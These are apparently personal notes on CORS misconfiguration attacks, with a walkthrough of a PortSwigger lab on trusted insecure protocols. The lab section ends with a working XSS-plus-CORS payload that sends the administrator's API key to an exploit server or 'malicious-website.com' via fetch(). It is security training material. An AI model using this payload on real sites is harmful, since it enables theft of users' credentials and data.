### Exploiting XSS via CORS trust relationships

   - Even "correctly" configured CORS establishes a trust relationship between two origins.
   - If a website trusts an origin that is vulnerable to cross-site scripting ([XSS](https://portswigger.net/web-security/cross-site-scripting)), then an attacker could exploit the XSS to inject some JavaScript that uses CORS to retrieve sensitive information from the site that trusts the vulnerable application.

**Given the following request:**
```js
GET /api/requestApiKey HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://subdomain.vulnerable-website.com 
Cookie: sessionid=...
```

**If the server responds with:**
```js
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com 
Access-Control-Allow-Credentials: true
```

**Then an attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like:**
```js
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

### Breaking TLS with poorly configured CORS

**Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:**
```js
GET /api/requestApiKey HTTP/1.1 
Host: vulnerable-website.com 
Origin: http://trusted-subdomain.vulnerable-website.com 
Cookie: sessionid=...
```

**The application responds with:**
```js
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com 
Access-Control-Allow-Credentials: true
```
In this situation, an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application

**This attack involves the following steps:**
   - The victim user makes any plain HTTP request.
   - The attacker injects a redirection to:
```js
http://trusted-subdomain.vulnerable-website.com
```

   - The victim's browser follows the redirect.
   - The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to:
```js
https://vulnerable-website.com   
```

   - The victim's browser makes the CORS request, including the origin:
```js
http://trusted-subdomain.vulnerable-website.com
```

   - The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
   - The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.

This attack is effective even if the vulnerable website is otherwise robust in its usage of HTTPS, with no HTTP endpoint and all cookies flagged as secure.

## Steps to solve lab
### Title - CORS vulnerability with trusted insecure protocols

**Desc** - This website has an insecure [CORS](https://portswigger.net/web-security/cors) configuration in that it trusts all subdomains regardless of the protocol. To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

**Creds** - wiener:peter

1. Try to find any CORS related headers in the application.
![[cors20.png]]
We got a end-point("/accountDetails"), which is most likely vulnerable. Let's test for it.

2. To test for CORS misconfiguration:
	1. We try to change the value of origin header to an arbitrary value.
	  **Before adding the Origin header** - 
	  ![[cors17.png]]
	  
	  **After adding the Origin header** - 
	  ![[cors18.png]]
	  As you can see above, it doesn't reflect value of "Origin" header in the "Access-Control-Allow-Origin" it means, it doesn't accept arbitrary origin.
	
      2.  Change the origin header to the null value.
       ![[cors24.png]]
       As you can see above, it doesn't reflect value of "Origin" header in the "Access-Control-Allow-Origin" it means, it doesn't accept null origin.
       
      3. Change the origin header to one that begins with the origin of the site.
       ![[cors25.png]]
       As you can see above, it doesn't reflect value of "Origin" header in the "Access-Control-Allow-Origin" it means, it may be check that origin should end with the site domain. In simple terms, origin should end with sites domain.

      4. Change the origin header to one that ends with the origin of the site.
       ![[cors26.png]]
       As you can see above, it reflects the origin in the "ACAO" header. There must be subdomain that can easily access this site with the help of CORS.


3. After roaming around in end-points, we got a subdomain and from the lab description we already know that it is vulnerable to XSS.
![[cors27.png]]

4. We successfully found out the XSS vulnerability in "productId" parameter.
![[cors28.png]]

5. Copy the below payload and paste it into the exploit server.
URL encode code - 
```js
<html>
    <body>
        <h1>Hello World!</h1>
        <script>
            document.location = "http://stock.0a4300dc048369248142437000e50076.web-security-academy.net/?productId=<script>var xhr = new XMLHttpRequest();var url = 'https://0a4300dc048369248142437000e50076.web-security-academy.net';xhr.onreadystatechange=function(){if(xhr.readyState == XMLHttpRequest.DONE){fetch('https://exploit-0a8300fb049e6943811f42cf01240004.exploit-server.net/log?key=' %2b xhr.responseText);}};xhr.open('GET', url %2b '/accountDetails', true);xhr.withCredentials = true;xhr.send(null);%3c/script>&storeId=1"
        </script>
    </body>
</html>
```

URL decoded code - 
```js
<html>
    <body>
        <h1>Hello World!</h1>
        document.location = "http://stock.0a4300dc048369248142437000e50076.web-security-academy.net/?productId=<script>
        var xhr = new XMLHttpRequest();
        var url = "https://vulnerable-website.com"
        xhr.onreadystatechange = function(){
            if(xhr.readyState == XMLHttpRequest.DONE){
                fetch("https://malicious-website.com/log?key=" + xhr.responseText)
            }
        }
        xhr.open('GET', url + "/accountDetails", true);
        xhr.withCredentials = true;
        xhr.send(null);</script>&storeId=1
        </script>
    </body>
</html>
```

![[cors30.png]]

![[cors29.png]]

![[cors31.png]]

Submit the apikey and lab will be solved.
